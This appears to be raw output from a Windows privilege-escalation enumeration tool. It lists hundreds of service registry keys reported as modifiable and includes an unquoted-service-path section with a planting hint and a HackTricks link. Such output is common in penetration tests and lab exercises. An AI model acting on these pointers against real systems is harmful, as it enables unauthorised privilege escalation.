You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fdPHost                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FDResPub                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FileInfo                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Filetrace                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\flpydisk                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FltMgr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FontCache                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FsDepends                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Fs_Rec                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FxPPM                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\gagp30kx                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\gencounter                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\GPIOClx0101                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HdAudAddService                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HDAudBus                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HidBatt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hidserv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HidUsb                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hkmsvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HpSAMD                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HTTP                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hwpolicy                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hyperkbd                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HyperVideo                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\i8042prt                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iaStorAV                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iaStorV                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ibbus                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IEEtwCollectorService                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IKEEXT                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\inetaccs                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\InetInfo                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\intelide                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\intelppm                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IpFilterDriver                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iphlpsvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IPMIDRV                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IPNAT                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\isapnp                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iScsiPrt                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\kbdclass                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\kbdhid                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\kdnic                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KeyIso                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KPSSVC                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KSecDD                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KSecPkg                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ksthunk                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KtmRm                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LanmanServer                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LanmanWorkstation                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ldap                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\lltdio                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\lltdsvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\lmhosts                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Lsa                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SAS                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SAS2                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SAS3                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SSS                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSM                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\luafv                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\megasas                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\megasr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mlx4_bus                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MMCSS                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Modem                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\monitor                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mouclass                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mouhid                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mountmgr                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mpsdrv                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MpsSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mrxsmb                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mrxsmb10                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mrxsmb20                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MsBridge                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSDTC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSDTC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Msfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mshidkmdf                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mshidumdf                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\msisadrv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSiSCSI                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\msiserver                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSKSSRV                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MsLbfoProvider                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSPCLOCK                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSPQM                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MsRPC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mssmbios                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSTEE                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MTConfig                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Mup                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mvumis                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\napagent                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NcaSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ndfltr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NDIS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisCap                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisImPlatform                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisTapi                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Ndisuio                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisVirtualBus                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisWan                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NDISWANLEGACY                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NDProxy                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NetBIOS                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NetBT                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Netlogon                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Netman                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\netprofm                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NetTcpPortSharing                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\netvsc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NlaSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Npfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\npsvctrig                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nsi                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nsiproxy                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NTDS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Ntfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Null                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nvraid                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nvstor                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nv_agp                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Parport                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\partmgr                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pci                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pciide                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pcmcia                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pcw                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pdc                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PEAUTH                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfDisk                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfHost                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfNet                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfOS                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfProc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pla                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PlugPlay                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PolicyAgent                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PortProxy                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Power                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PptpMiniport                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PrintNotify                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Processor                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ProfSvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Psched                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PsShutdownSvc                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ql2300i                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ql40xx2i                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\qlfcoei                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasAcd                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasAgileVpn                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasAuto                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Rasl2tp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasMan                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasPppoe                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasSstp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\rdbss                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDMANDK                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\rdpbus                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDPDR                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDPNP                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDPUDD                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RdpVideoMiniport                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ReFS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RemoteAccess                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RemoteRegistry                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RpcEptMapper                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RpcLocator                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RSoPProv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\rspndr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\s3cap                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sacdrv                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sacsvr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sbp2port                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SCardSvr                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ScDeviceEnum                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\scfilter                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Schedule                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SCPolicySvc                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sdbus                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sdstor                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\secdrv                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\seclogon                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SENS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SerCx                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SerCx2                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Serenum                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Serial                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sermouse                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SessionEnv                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sfloppy                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SharedAccess                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ShellHWDetection                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SiSRaid2                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SiSRaid4                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\smbdirect                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\smphost                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SNMP                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SNMPTRAP                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\spaceport                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SpbCx                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Spooler                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sppsvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\srv                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\srv2                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\srvnet                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SSDPSRV                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SstpSvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\stexstor                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storahci                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storflt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\stornvme                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storvsc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storvsp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\svsvc                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\swenum                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\swprv                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SysMain                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SystemEventsBroker                           
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TapiSrv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Tcpip                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TCPIP6                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TCPIP6TUNNEL                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tcpipreg                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TCPIPTUNNEL                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tdx                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\terminpt                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TermService                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Themes                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\THREADORDER                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TieringEngineService                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TPM                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TSDDD                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TsUsbFlt                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TsUsbGD                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tsusbhub                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tunnel                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\uagp35                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UALSVC                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UASPStor                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UCX01000                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\udfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UEFI                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UI0Detect                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\uliagpkx                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\umbus                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UmPass                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UmRdpService                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\upnphost                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbccgp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbehci                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbhub                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\USBHUB3                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbohci                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbprint                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\USBSTOR                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbuhci                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\USBXHCI                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VaultSvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vdrvroot                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vds                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VerifierExt                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vhdmp                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\viaide                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Vid                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmbus                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VMBusHID                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmbusr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicguestinterface                           
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicheartbeat                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmickvpexchange                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicrdv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicshutdown                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmictimesync                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicvss                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\volmgr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\volmgrx                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\volsnap                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vpci                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vpcivsp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vsmraid                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VSS                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VSTXRAID                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\W32Time                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\w3logsvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\W3SVC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WacomPen                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wanarp                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wanarpv6                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WAS                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wcmsvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WcsPlugInService                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wdf01000                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wecsvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WEPHOSTSVC                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wercplsupport                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WerSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WFPLWFS                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WIMMount                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WindowsScheduler                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinHttpAutoProxySvc                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinMad                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Winmgmt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinNat                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinRM                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Winsock                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinSock2                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinVerbs                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WmiAcpi                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WmiApRpl                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wmiApSrv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\workerdd                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WPDBusEnum                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ws2ifsl                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WSService                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wtlmdrv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wuauserv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WudfPf                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wudfsvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\XEN                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenbus                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenbus_monitor                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenfilt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xeniface                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xennet                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenvbd                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenvif                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xmlprov                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\{35E1B823-1443-4A40-875E-3A1C41494DB7}       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\{51E2531C-2946-4F58-A4BB-072994EB3731}       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\{C7568B63-C424-48B3-AB9B-6D1F004D5AFC}       
                                                                                                                 
 [+] UNQUOTED SERVICE PATHS                                                                                      
   [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Program.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'                                                                 
   [i] The permissions are also checked and filtered using icacls                                                
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                 
aspnet_state                                                                                                     
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe                                                
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)                 
                                                                                                                 
AWSLiteAgent                                                                                                     
 C:\Program Files\Amazon\XenTools\LiteAgent.exe                                                                  
Invalid parameter "Files\Amazon\XenTools\LiteAgent.exe"                                                          
NetTcpPortSharing                                                                                                
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                   
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)                    
                                                                                                                 
PerfHost                                                                                                         
 C:\Windows\SysWow64\perfhost.exe                                                                                
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)                                                 
                                                                                                                 
PsShutdownSvc                                                                                                    
 C:\Windows\PSSDNSVC.EXE                                                                                         
C:\Windows\PSSDNSVC.EXE NT AUTHORITY\SYSTEM:(I)(F)                                                               
                        BUILTIN\Administrators:(I)(F)                                                            
                                                                                                                 
TrustedInstaller                                                                                                 
